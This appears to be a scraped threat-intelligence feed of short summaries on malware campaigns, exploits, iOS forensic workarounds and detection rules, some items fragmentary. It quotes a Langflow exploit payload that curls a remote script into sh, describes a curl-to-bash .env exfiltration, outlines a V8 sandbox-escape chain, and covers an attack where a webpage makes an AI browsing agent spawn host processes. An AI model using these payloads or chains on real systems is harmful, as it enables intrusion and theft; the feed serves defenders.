item.title: Malicious Edge extension abuses Native Messaging as bridge to malware
item.description:
"Edgecution" malware abuses Chrome Native Messaging to break out of the Edge browser sandbox and deploy a Python backdoor, serving as a bridge for the Payouts Kings ransomware operation.
Key findings:
- Initial access via Microsoft Teams vishing: attackers pose as IT support and direct victims to a fake "Outlook Updates Management Console" that downloads a malformed-header ZIP, pastes clipboard scripts, or phishes M365 credentials. Three delivery options: AutoHotKey, batch script, or PowerShell.
- The ZIP contains embedded Python 3.13.3 plus extension and native directories. A scheduled task launches a headless Edge instance running the malicious extension (disguised as "Edge Monitoring Agent"), invisible to the user.
- Sandbox escape via Chrome Native Messaging: the extension invokes a batch file in the native directory, which is registered via a native messaging manifest, spawning the Python backdoor as a separate host-level process outside the browser sandbox (T1559).
- The Python backdoor accepts commands relayed from the extension: execute shell or PowerShell, run arbitrary Python, write files, enumerate processes, and gather system info. Unused commands suggest active development.
Hunt for: scheduled tasks launching msedge.exe with --headless flags, unexpected native messaging manifests under HKCU\Software\Google\Chrome\NativeMessagingHosts or the Edge equivalent, and unsigned Python runtimes in user-writable directories.

item.title: I Wasted 3 Days Intercepting a Flutter App. Here’s What Actually Works.
item.description:
Flutter apps silently block proxy interception because BoringSSL bypasses Android's certificate trust chain entirely. Three days of failed attempts led to a two-script Frida solution covering every TLS validation layer at once.
Key findings:
- Flutter ships its own TLS stack via BoringSSL compiled into libflutter.so, completely ignoring Android's system CA store. Installing Burp's CA through device Settings has zero effect. ReFlutter patches only the Flutter binary and misses any Java or WebView connectivity checks that run before Dart initializes.
- disable-flutter-tls-v1.js finds ssl_verify_peer_cert in libflutter.so via byte pattern matching across arm64, arm, x64, and x86, then replaces it with a stub returning 0. A retry loop with five one-second delays handles the common silent failure where Frida attaches before libflutter.so finishes loading.
- universal_bypass.js covers the Java layer: custom X509TrustManager, SSLContext hook, HostnameVerifier, WebViewClient, and crucially InAppWebViewClient at com.pichillilorenzo.flutter_inappwebview_android.webview.in_app_webview.InAppWebViewClient. That last hook was missing from every existing script and is the reason WebView traffic stays blocked even when everything else works.
- When scripts alone are not enough: iptables DNAT redirects port 443/80 to Burp at kernel level since Flutter ignores Android proxy settings.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069798749518328004

item.title: StealC and Amadey: Breaking down infostealers and the cybercrime services that deliver them
item.description:
Microsoft and Europol disrupt 200+ StealC and Amadey C2 domains on June 24, 2026, exposing the full MaaS infostealer pipeline from credential theft to ransomware deployment.
Key findings:
- StealC (C++) defeats Chromium App-Bound Encryption via APC injection into a suspended process, writing decrypted credentials to C:\ProgramData\<HWID>.txt before exfil. It also raids Outlook profiles under HKCU\Software\Microsoft\Office\<version>\Outlook\Profiles, WinSCP sessions from HKCU\Software\Martin Prikryl\WinSCP 2\Sessions, and Steam files including ssfn* and loginusers.vdf. All data is RC4-encrypted and Base64-encoded before POST to C2. Self-delete fires last if the flag is set.
- Amadey (active since 2018) persists as nudwee.exe under C:\Users\<user>\e079729711 via scheduled task, communicates over HTTP with RC4+hex encoding, and supports 20+ backdoor commands including enabling RDP (fDenyTSConnections=0), creating hidden admin accounts, and loading cred.dll and clip.dll plugins at runtime.
- IOCs from the report: StealC C2 at hxxp://polse[.]us/62ea47cac2534aa18f74.php and hxxp://bluescry[.]com/01f96fd710e905ca2326.php; Amadey C2 at hxxp://microsoft-telemetry[.]at/cvdfnaFJBmC0/index.php. Full hash and URL list in the Microsoft Security blog.
Hunt for nudwee.exe, scheduled tasks pointing to the e079729711 directory, rundll32 loading cred.dll or clip.dll, and outbound HTTP POST to .php endpoints with RC4+Base64 bodies.

item.title: StrikeShark: investigating a new campaign delivering Cobalt Strike through SharkLoader
item.description:
StrikeShark: previously undocumented SharkLoader delivers Cobalt Strike Beacon across government, diplomatic, and software targets in 10+ countries. Attribution points to Chinese-speaking 🇨🇳 actors with low confidence; no known APT overlap.
Key findings:
- SharkLoader uses DLL sideloading via a copied legitimate SystemSettings.exe to load a three-stage chain: SystemSettings.dll (main loader) decrypts DscCoreR.mui with Blowfish ECB, which decrypts SyncRes.dat with AES-128, then decompresses and executes Cobalt Strike Beacon entirely in memory. MZ headers are stripped from encrypted files as an anti-analysis measure.
- Initial access exploits a wide range of public-facing vulns: CVE-2021-26855 (ProxyLogon), CVE-2023-32315 (Openfire), CVE-2024-36401 (GeoServer), CVE-2024-21762 (FortiOS), CVE-2023-46747 (F5 BIG-IP), and others. Webshells establish post-exploitation footing; dropper lures include fake GoogleUpdateStepup.exe and AnyConnect installers.
- SyncRes.dat installs 25+ API hooks via Microsoft Detours, including PPID spoofing under svchost.exe, direct syscall stubs via jitasm to bypass EDR, and ETW kill hooks on EtwEventWrite/EventWrite that return 0 silently. Post-compromise tools FScan, Searchall, Pillager, SharpGPOAbuse, Procdump64, and ntdsutil indicate credential theft and AD enumeration.

item.title: Incident Response Playbook: Malicious OAuth Apps in Entra | Invictus Incident Response
item.description:
A five-step OAuth app response playbook for Entra environments, covering detection through eradication, with concrete log sources and a malicious consent timeline built from real-world IR.
Key details:
- Detection starts in Audit Logs and Unified Audit Logs (UAL): watch for new service principal creation, consent grant events (Consent to application), client secret or certificate additions (Update application - Certificates and secrets management), and service principal sign-ins from unexpected IPs or user agents. These are your earliest forensic signals before full escalation.
- Blast radius assessment requires checking three separate planes: Entra ID directory roles (Application Administrator can pivot to other high-privilege apps), Azure RBAC at subscription level (Owner/Contributor enables infrastructure tampering), and Graph API permission type. Application-scoped Mail.Read is tenant-wide mailbox access; delegated Mail.Read is scoped to one user. That distinction defines the investigation scope.
- Contain before you analyze: disable sign-ins via the Enterprise Application Properties toggle, revoke refresh tokens for consenting users, and use the Entra App Registration deactivation feature to block new token issuance while preserving metadata for forensics.
- The malicious consent kill chain produces artifacts across five log sources: Audit Logs, UAL, Sign-In Logs (interactive and non-interactive), Microsoft Graph Activity logs, and Azure Activity Logs.

item.title: FortiBleed: The Broker Who Turned 73,000 Firewalls Into a Product Catalog
item.description:
"FortiBleed" exposes a live access-brokering operation: valid credentials for 73,932 Fortinet firewalls across 21,632 orgs in 194 countries, cataloged by revenue tier and ready for resale to ransomware crews.
Key findings:
- Researcher Volodymyr "Bob" Diachenko found an accidentally exposed server in mid-June 2026 belonging to threat actor "SantaAd," active on a Russian-speaking cybercrime forum since early 2025. The leaked data was annotated with company name, sector, annual revenue, and employee count, sorted into purchase tiers. This is not espionage; it is a product catalog optimized for ransomware affiliate sales.
- The operation ran a dedicated brute-force server testing over a billion device-and-password pairs through rotating proxies, a GPU cluster of roughly 45 cards running open-source password cracking, and a third workstation managing seven disposable Kali Linux VMs for post-access work. Custom tooling showed AI code-editor fingerprints, including emoji status messages and Step 1/2/3 formatting.
- Some cracked credentials were long and complex. Password strength alone did not stop this operation. Credential theft at scale through brute force plus cracking bypasses complexity requirements entirely.
- When the story broke, the broker raised the auction price and cited news coverage as an authenticity guarantee.
Takeaway: Pull FortiGate management interfaces off the public internet now. Enforce MFA on VPN and admin access.

item.title: Bypassing Stolen Device Protection: Alternative Ways of Installing the Extraction Agent
item.description:
ElcomSoft's iOS Forensic Toolkit now installs its extraction agent via OTA without USB pairing, neutralizing Stolen Device Protection's biometric gate for authorized examiners with the device passcode.
Key details:
- Stolen Device Protection blocks the "Trust This Computer" pairing step by requiring Face ID or Touch ID away from familiar locations, no passcode fallback. That single gate killed logical and agent-based low-level extraction workflows. This method avoids the pairing entirely: the toolkit runs a local web server, the examiner installs a signed certificate in Safari on the device, and the agent sideloads over local network (wired adapter or isolated Wi-Fi) rather than USB.
- Prerequisites are real and non-trivial: device passcode, physical unlocked access, a paid Apple Developer account to sign the agent, and Developer Mode enabled (iOS 16+, requires passcode confirmation after restart). MDM-supervised devices may reject the profile outright.
- Full file system and Keychain extraction remain the outcome where a compatible checkm8 exploit exists for the build, matching what a traditional pairing-based install would produce.
- Critical operational note: keep the device off the open internet the entire time. Remote lock, remote wipe, or iCloud sync during extraction can destroy the evidence. A dedicated hardware firewall (even a Raspberry Pi) is the recommended isolation method.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069707645154373667

item.title: Sideloading the extraction agent: a Stolen Device Protection workaround
item.description:
iOS Stolen Device Protection (SDP) now auto-enables in iOS 26.4, blocking USB pairing to forensic workstations. ElcomSoft's EIFT update routes around it via OTA network agent delivery.
Key findings:
- SDP blocks cable-based agent installation because connecting to an unfamiliar computer triggers a mandatory biometric check (Face ID/Touch ID) with no passcode fallback. Starting iOS 26.4, Apple enables SDP by default, making this a routine blocker rather than an edge case. Passcode must still be known; this does not crack locked devices.
- The workaround delivers the extraction agent OTA over an isolated network link (USB-C direct on macOS, Ethernet adapters, or isolated Wi-Fi AP) instead of through a trusted cable pairing. The SDP biometric gate is not triggered because no new computer trust relationship is established.
- The installation chain requires a paid Apple developer account, UDID retrieval via Recovery mode, a self-signed root certificate deployed as a configuration profile, Developer Mode enabled on iOS 16 plus, and a hardware firewall to block remote lock or wipe before first agent launch.
- Artifact risk: if the hardware firewall is skipped before first launch on accounts created after 2021, iCloud sync or remote wipe could alter or destroy the evidentiary state of the device mid-acquisition.

item.title: Inside FortiBleed: Reverse Engineering the CyberStrike Harvester Behind a Global FortiGate Credential Factory
item.description:
FortiBleed campaign runs a credential factory against internet-facing FortiGate firewalls globally, combining stuffing, spraying, config harvesting, and offline cracking into a fully automated pipeline.
Key findings:
- No malware payload is dropped. The attacker's tool, CyberStrike Harvester, is an automated pipeline that performs credential stuffing and password spraying against FortiGate SSL VPN portals, harvests full device configurations post-authentication, then cracks offline to extract additional credentials. The attack leaves minimal host-side artifacts.
- Configuration harvesting is the critical pivot. Once any credential authenticates, the tool pulls the full FortiGate config, which contains hashed local user passwords, LDAP bind credentials, and IPsec PSKs. Offline cracking turns one valid login into many, expanding access far beyond the initial foothold.
- Because the pipeline is authentication-based, traditional network-layer detections may miss it. Evidence lives in FortiGate auth logs, VPN session logs, and API access records. Look for high-volume login attempts followed by config-export API calls from unexpected source IPs.
- Scope is global and targets internet-exposed management and SSL VPN interfaces, making any unpatched or weakly-credentialed FortiGate a candidate target.
Audit FortiGate auth logs for config-export API calls (specifically /api/v2/monitor and backup endpoints) shortly after successful logins.

- The vulnerability lives in Livewire's hydration process: the framework fails to verify submitted component state before deserializing it, letting an unauthenticated attacker inject a PHPGGC gadget chain via a crafted HTTP request and achieve RCE. No auth required, fully automated at scale (T1190).
- Once in, the attacker curls shoc.enz (SHA256: 548c3672fd3201dab56f714fdd5812bb024980815b3a2b6299f0126bdf16fb3e) from hxxps://xantibot[.]pw/database-sell/shoc.enz and pipes it to bash. The 5,269-byte script recursively hunts every .env file on the filesystem (T1083, T1552.001), stages and zips them, then exfiltrates to FTP at 47.129.100[.]149, Telegram, and GoFile before wiping the staging directory (T1070.004).

item.title: A Valid Microsoft Signature Does Not Mean a Driver Is Safe by Lucie Cardiet
item.description:
Hackledorb (DragonForce) spent 1-2 months inside a major US 🇺🇸 services firm using four signed kernel drivers to kill security tools before dropping ransomware. One driver had zero CVEs when deployed.
Key details:
- BYOVD chain: operators loaded four kernel-mode drivers in sequence. Three carried documented CVEs not yet on Microsoft's blocklist. The fourth, a Huawei audio driver they renamed "Havoc Process Terminator," had no known vulnerability at all at deployment time. Huntress published analysis three months after the attack.
- The blocklist problem is structural, not procedural. Drivers get added after weaponization, after a CVE is filed, after a campaign generates visibility. Attackers operate in the gap between exploitation and defense. GentleKiller, a separate BYOVD framework linked to a second ransomware group, confirms this is repeatable: 478 victims across 70+ countries, pulling from the same shared library of signed drivers from gaming, security, hardware, and enterprise software vendors.
- There is one detection window before the kill sequence closes: Event ID 7045, logged when a driver installs as a Windows service. This fires while security tools are still running. After the kill sequence executes, that window is gone.
- Memory Integrity (HVCI) blocks BYOVD structurally before it starts. Most enterprise environments have not enabled it due to hardware requirements and compatibility testing overhead.

item.title: What the Miasma campaign reveals about the new supply chain threat model and the underground market for developer credentials
item.description:
A stolen npm token sat in infostealer logs for seven weeks before attackers used it to poison 89+ packages across Red Hat 🇺🇸, Vapi.ai, and Microsoft Azure repos, validating a new industrialized supply chain threat model.
- The Miasma worm (derived from TeamPCP's open-sourced Mini Shai-Hulud, released May 12) hit in three waves June 1-5. Wave 1 compromised 32 @redhat-cloud-services packages via a stolen GitHub session cookie first seen in underground markets April 13. Wave 2 introduced "Phantom Gyp," a 157-byte binding.gyp file that bypasses preinstall-script monitoring entirely. Wave 3 pushed malicious commits to Azure/durabletask, forcing GitHub to disable 73 repositories in 105 seconds.
- SLSA Build Level 3 provenance attestations appeared valid on malicious packages because Red Hat's legitimate OIDC-backed GitHub Actions pipeline built them. The pipeline was compromised, not the attestation mechanism. Provenance proves the builder, not the build's cleanliness.
- Wave 3 dropped AI coding assistant config overrides: .claude/settings.json, .cursor/rules, and Gemini CLI and VS Code configs. These trigger on IDE open, not npm install, expanding the attack surface beyond registries into the developer's local environment.
- Detection anchors from the report: GitHub repos described "Miasma: The Spreading Blight," GCP user-agent string google-api-nodejs-client/7.0.0, dead-drop account liuende501[.]

item.title: Payouts King Ransomware Initial Access Broker Deploys New Edgecution Malware
item.description:

Key details:

The page offers three deployment paths: an AutoHotKey script, a clipboard-delivered batch script, or PowerShell, plus a credential-harvesting form stealing Microsoft 365 passwords. A scheduled task launches Edge headless with --load-extension and --headless=new, making the extension invisible to the user.

item.title: From Langflow to Monero: Inside CVE-2026-33017 Cryptominer
item.description:

Key findings:
- Initial access is a single unauthenticated POST to /api/v1/build_public_tmp/{flow_id}/flow with __import__('os').system('curl hxxp[://]83.142.209[.]214:8080/isp[.]sh | sh') (T1190, T1059.006). The operator reused flow_id 0ee284cc-0eb1-493f-bc60-94fa8d1cfd18 across 19 days of observed attacks, a detection gift. Recon used 10 spoofed UAs in 5 seconds before switching to a stable python-requests/2.25.1 for exploitation.
- Dropper isp.sh creates /var/tmp/.xlamb/, downloads the UPX-packed Go ELF lambsys, then SSH-worms to every host in known_hosts plus ssh-agent loaded keys using BatchMode=yes and StrictHostKeyChecking=no (T1021.004, T1552.004). Scope is directly tied to Langflow's deployment privileges.
- lambsys (SHA256: 71af8bd9...) runs a 39-process kill list targeting Kinsing, WatchDog, Outlaw, and Rocke rivals, kills processes on 12 mining ports via netstat, disables AppArmor, SELinux, UFW, iptables, the kernel NMI watchdog, and Aliyun's security agent, then deletes /var/log/syslog (T1562.001, T1562.004, T1070.002).
- Persistence is a cron job every 5 minutes plus init_rmount at /var/tmp/init_rmount on a 60-second loop, both re-downloading lambsys from C&C if missing.

item.title: Testing AI Threat Hunting against Real-World KQL: A Side-by-Side Test
item.description:
AI-generated KQL caught only 3 of 12 real results in a head-to-head hunt test, exposing a 75% false-negative rate that would leave defenders blind in production.
Key findings:
- Both ChatGPT (GPT-5.5) and Claude (Sonnet 4.6) scoped their queries to DeviceProcessEvents alone, missing roughly 70% of telemetry. The human query searched DeviceProcessEvents AND DeviceEvents, which is where much of the PowerShell ScriptContent and ActionType telemetry lives. Querying only one table is a silent coverage gap, not a syntax error.
- ChatGPT's query failed to execute entirely due to unsupported pipe-chaining syntax. Claude's ran but returned 3 results versus 12 from the human query. A query that runs and looks reasonable is not the same as a query that hunts accurately.
- The human query used regex across ActionType values (PowerShellCommand, ProcessCreated, ScriptContent) and pulled ScriptContent from AdditionalFields via parse_json, catching encoded and in-memory invocations the LLMs missed by filtering only on process name and command-line strings.
- Schema awareness is the core gap. LLMs produce syntactically plausible KQL but don't know which fields carry what data in your environment. Hunting for the literal string Invoke-Mimikatz or scoping only to powershell.exe creates the illusion of coverage.
Takeaway: use LLMs to prototype and review discrete query blocks, not to own the full hunt.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069405783557652664

item.title: Detections Digest #20260622
item.description:
Detection engineering digest covers 48 new and 47 updated rules across 10 repos, with standout additions for CVE-2026-33825 LPE, BYOVD, RMM abuse, and cross-platform credential theft.
Key updates:
- Splunk added 9+ rules for CVE-2026-33825 (BlueHammer/RedSun LPE exploits), monitoring MsMpEng writing to System32, VSSVC accessing Defender engine binaries, cldapi.dll loaded by uncommon processes, and TieringEngineService.exe spawning suspicious children. Separately, CVE-2026-4681 PTC Windchill rules hunt for GW_READY_OK probe strings in MethodServer log4j events signaling pre-exploitation recon.
- LOLDrivers updated MD5, SHA1, SHA256, and IMPHASH blocklists plus driver filename filters to catch current BYOVD campaigns bypassing HVCI for kernel-level access. LOLRMM added JumpCloud*.exe, Remotely_Agent.exe, and Remotely_Desktop.exe process detections for RMM-based persistence.
- SigmaHQ added a rule for registry enumeration via WMIC StdRegProv (EnumKey, EnumValues, GetStringValue), a technique adversaries use to bypass reg.exe-focused monitors. item.description:

item.title: Out of Shift: How a Shared State Bug in V8’s AsmJS Parser Broke the Ubercage
item.description:
CVE-2026-3542 in Chrome's V8 AsmJS parser corrupts WebAssembly opcode streams, bypassing the Ubercage sandbox entirely to reach arbitrary code execution from a single bug.
Key findings:
- CVE-2026-3542, patched March 3 2026, lives in AsmJsParser::ValidateHeapAccess(). The heap_access_shift_position_ attribute is instance-level state shared across all recursive parse calls. A nested shift expression like HEAP32[1 << (n >> 2)] causes ShiftExpression() to recurse, overwriting that position with a stale offset. When DeleteCodeAfter() truncates the opcode stream using that stale value, subsequent opcodes are left misaligned and later emitted immediates become orphaned opcodes the decoder executes unchecked.
- The Ubercage bypass is structural, not incidental. AsmJS-generated opcodes skip ValidationTag::validate entirely because V8 trusts its own parser output. An attacker who controls the corrupted stream can inject opcodes like kExprCallRef or kExprStructGet with no type-safety checks, treating arbitrary 64-bit values on the stack as addresses. This gives out-of-sandbox read/write from a single memory-corruption primitive.
- Exploit chain: spray TypeDefinition structs on the canonical type zone so a cross-module struct type lands adjacent to the AsmJS module's type vector. Use kExprI64Const to place a crafted 64-bit address on the stack, then kExprStructGet/kExprStructSet for arbitrary read/write.

item.title: Building a CI/CD pipeline for Sigma rules

item.title: FortiBleed: Everything You Need to Know

item.description:

item.title: AutoJack: How a single page can RCE the host running your AI agent
item.description:
AutoJack: a three-flaw chain in AutoGen Studio's MCP WebSocket lets a malicious webpage rendered by a local browsing agent spawn arbitrary processes on the developer's host with no user interaction beyond visiting a URL.
Key findings: - Three weaknesses chain together: Origin allowlist bypassed because the agent's headless browser is localhost (CWE-1385), auth middleware explicitly skipping /api/mcp/* with no handler picking up the check (CWE-306), and server_params decoded from the URL passed verbatim to stdio_client as a command line (CWE-78), accepting calc.exe, powershell.exe, or bash as valid "MCP servers" - Attack flow: attacker page serves JavaScript that opens ws://localhost:8081/api/mcp/ws/?server_params= with a base64 payload, agent's MultimodalWebSurfer renders it, AutoGen Studio spawns the command under the developer's account, no token required regardless of auth mode configured - Affected code never shipped in a PyPI release; exposure limited to developers who built from the main GitHub branch before hardening commit b047730, which adds server-side parameter binding via a POST/UUID flow and removes /api/mcp from the auth skip list - Broader pattern: any agent that browses untrusted content and shares a host with a privileged local control plane dissolves the loopback trust boundary, this is not specific to AutoGen.

item.title: DCOM Explained: How Attackers Turn a Windows Feature into a Lateral Movement Tool
item.description:
DCOM lateral movement exploits native Windows RPC infrastructure to execute commands remotely without dropping a single malicious file, making process-chain correlation your primary detection lever.
Key findings: - Attack chain (T1021.003): attacker dumps creds from lsass.exe on Machine A, authenticates to Machine B over TCP 135, instantiates MMC20.Application via CLSID C085698C-D16F-417A-8851-A263C70D21B6, then calls ExecuteShellCommand. No payload dropped; only signed Windows binaries touch disk. - Four-event correlation catches it: Event ID 4624 Logon Type 3 (NTLM network logon) + Sysmon Event ID 3 (TCP 135 connection between workstations) + Sysmon Event ID 1 showing mmc.exe or excel.exe spawned under svchost.exe -k DcomLaunch + cmd.exe or powershell.exe as a child of that DCOM host process. - The RPCSS Endpoint Mapper (rpcss.dll) handles port 135 negotiation and permission checks via HKCR\CLSID before SCM spawns the target process, so registry auditing on that key can surface unauthorized CLSID lookups. - Prevention: block TCP 135 between workstations at the firewall, strip remote activation rights from non-admin accounts in DCOM config, and deploy LAPS to break lateral reuse of local admin credentials.
Hunt for powershell.exe or cmd.exe whose grandparent is svchost.exe -k DcomLaunch. That two-hop parent chain is rare in legitimate traffic and is the clearest signal this technique leaves behind.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2067790451894333892

item.title: FortiBleed: You Can't Patch Your Way Out of This
item.description:

CVE-2024-21762 (CVSS 9.6) drives the symlink persistence in /data/etc/ and /data/lib/, surviving reboots and firmware upgrades. - CVE-2026-25815 (CVSS 3.2, exploited in the wild) is the quiet killer: a shared default key decrypts LDAP credentials out of any stolen config. Low score, catastrophic real-world impact. - The SHA-256 old-password field persists after upgrade until an admin logs in post-patch. It does not appear in a normal admin view, only in a super_admin config export. A fully patched device can still carry a crackable credential hash.
Takeaway: Export config as super_admin and audit the old-password field. Hunt /data/etc/ and /data/lib/ for unexpected symlinks. Check your org against the Hudson Rock lookup.

item.title: Tor-Based Clipper Malware Targets Wallet Seed Phrases
item.description:

Key findings: - Attack chain starts with a .lnk shortcut on a USB drive. The malware hides real documents, replaces them with malicious shortcuts of the same name, then schedules tasks to self-propagate to any newly inserted USB (T1091, T1053.005). - Clipboard is polled every 500ms for Bitcoin, Ethereum, Tron, and Monero addresses, BIP39 12/24-word seed phrases, and Ethereum/Bitcoin WIF private keys. Detected addresses are swapped for attacker-controlled lookalikes before the victim pastes (T1115). - C2 hides entirely inside Tor using a bundled portable Tor client and a local SOCKS5 proxy on port 9050, resolving .onion domains with no exposed IP. Five screenshots are captured every ten seconds and exfiltrated over the same channel. - An EVAL instruction from C2 downloads JavaScript into a file named "cfile" and executes it via Windows Script Host, turning a clipper into a full backdoor (T1059.007). All components are PyArmor-obfuscated, PyInstaller-packaged, and decrypted only at runtime. - Microsoft Defender for Endpoint detects this as Trojan:Win32/CryptoBandits.A.
Hunt for wscript.exe or cscript.exe spawning child processes, any process establishing connections to localhost:9050, and screen-capture commands in PowerShell.

item.title: Lost in relocation: analysis of a new loader distributing CASTLESTEALER
item.description:
New loader OXLOADER delivers CASTLESTEALER infostealer via malicious Google Ads, with low static detection rates. Shellcode staged through the Windows .reloc section and DonutLoader marks deliberate evasion engineering from a likely Russian-speaking actor.
Key findings: - Malvertising chain: victims searching for Node.js clicked a sponsored result to node-js[.]prentiva99[.]info, redirected through app[.]miloyannopoulos[.]com, then served a batch script from Storj (SHA-256: fdfc7831e5c24cfa80152860dfe8c056ba079f7df1393bf6bb7b18ed974eda37) that launched OXLOADER with UAC bypass via -Verb RunAs (T1548.002) - OXLOADER uses control-flow flattening, opaque predicates, MBA obfuscation, and self-modifying XOR decryption stubs to defeat static analysis; shellcode is hidden in the .reloc section (legitimate toolchains never emit code there) then copied to a RWX .xtext section inside a renamed dui70.dll copy with .ocx extension - Anti-analysis checks require 3+ CPUs, 3+ GB RAM, display refresh rate above 20 Hz via WMI Win32_VideoController, and abort on CIS GEOIDs or Russian 🇷🇺 LANGID 0x419; emulation is defeated by calling WNetAddConnection2W with a malformed resource and reading LastErrorValue directly from the TEB - CASTLESTEALER C2: 89[.]124[.]95[.]161 and 89[.]124[.]115[.]82; OXLOADER hashes include 9a9939dff297997732aaade9b243d695632cbd64033c5fbcb9de3d09b7e6c28d and c85f2765a6c3c3f3907c17e57df12f8f68826f74bff3bbfd272af50666d065fe.

item.title: SmartApeSG Launches Okendo Reviews Supply Chain Attack
item.description:
SmartApeSG compromised the Okendo Reviews widget used by 18,000+ brands, injecting staged JavaScript into e-commerce sites reaching millions of visitors and funneling them toward RAT and infostealer payloads via ClickFix lures.
Key findings: - Supply chain reach was massive: one affected U.S. 🇺🇸 retailer alone draws ~7 million monthly visits. The widget loads on high-traffic storefront and product pages, so the malicious JS executed silently in visitor browsers with no action required from site owners. - The injected script (JS.Injection.SmartApeSG) used localStorage timestamp checks to suppress repeat execution and User-Agent filtering to skip mobile devices, targeting desktop users primed for ClickFix-style fake CAPTCHA and Windows Run-dialog lures. - Infrastructure was hidden via XOR-decoded string fragments reassembled at runtime, with a randomized 8-character token appended and a dynamic script tag injected to pull the next stage from hxxps://api[.]wigetticks[.]com/logout/private-response[.]php?8D1V4th3 and hxxps://api[.]wizzleticks[.]com/claims/scope-schema[.]php?4ManBBdA. - End payloads align with prior SmartApeSG campaigns: NetSupport RAT, Remcos RAT, StealC, and Sectop RAT delivered via PowerShell or HTA downloaders after social engineering.
Hunt your proxy and DNS logs for requests to wigetticks[.]com and wizzleticks[.]com, and inspect CSP and SRI logs for third-party script loads from okendo[.]io around May 14.

item.title: LATAM Infrastructure Hit by Fortinet and Ivanti Exploits
item.description:
Operation Escaneo exposed: a coordinated campaign hit Mexican 🇲🇽 government, financial, and critical infrastructure targets via chained Fortinet and Ivanti exploits, leaving 1.3M+ records and Active Directory maps stolen.
Key findings: - Initial access via CVE-2022-42475, CVE-2024-21762 (FortiOS SSL-VPN) and CVE-2023-46805, CVE-2024-21887, CVE-2025-0282 (Ivanti Connect Secure), with PoC code tuned to avoid crashing targets. Lateral movement extended to GhostCat, EternalBlue, Zerologon, and Log4Shell. - Custom recon engine "Kimera" auto-scanned and triaged victims, feeding directly into the exploitation stage. Neo-reGeorg webshells landed first, then Chisel reverse tunnels (3,708 sessions over 13 days) and a GRE tunnel through a compromised Cisco router moved traffic below host-based detection. - Exfil included 1.3M personal records, a 407MB Active Directory map, live-streamed SSL private keys, SAP service-account hashes, and browser-stored passwords. Attackers reached SAP and Oracle for command execution inside victim networks. - The group was exposed by an open staging directory, a self-inflicted OPSEC failure that let CloudSEK reconstruct the full toolkit.
Hunt for GRE tunnels terminating at external IPs, Chisel TCP-over-HTTP sessions, and unexpected process execution under SAP or Oracle service accounts. Patch the listed Fortinet and Ivanti CVEs first; those are confirmed active entry points here.
